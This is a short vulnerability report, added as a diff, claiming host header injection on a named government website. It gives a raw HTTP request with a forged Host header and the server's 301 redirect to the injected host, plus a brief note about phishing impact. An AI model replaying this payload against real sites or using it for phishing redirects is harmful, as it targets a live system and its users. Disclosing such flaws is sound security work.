@@ -1,0 +1,35 @@
+hello everybody i found today host header injection in this domain www.hdb.gov.sg
+
+----------------------------------------------------------------------------------------------------
+POC:-
+----------------------------------------------------------------------------------------------------
+Request:-
+GET / HTTP/1.1
+Host: www.bing.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+----------------------------------------------------------------------------------------------------
+Response:-
+HTTP/1.1 301 Moved Permanently
+Date: Tue, 01 Oct 2019 16:15:49 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-DIS-Request-ID: ef6993bb7c380b928896a41c59010f40
+Server: DOSarrest
+Location: https://www.bing.com/
+Content-Length: 253
+
+<html><head><title>301 Moved Permanently</title></head><body bgcolor='white'><center><h1>301 Moved Permanently</h1><h2>Object moved to <a href='https://www.bing.com/'>here</a>.</h2></center><hr><center>DOSarrest Internet Security</center></body></html>
+
+----------------------------------------------------------------------------------------------------
+IMAGES:-
+
+
+impact:-
+ Whenever a user visits this URL, it will redirect them to site.com. It is used in phishing attacks.
+ Reference: https://www.acunetix.com/vulnerabilities/web/host-header-attack
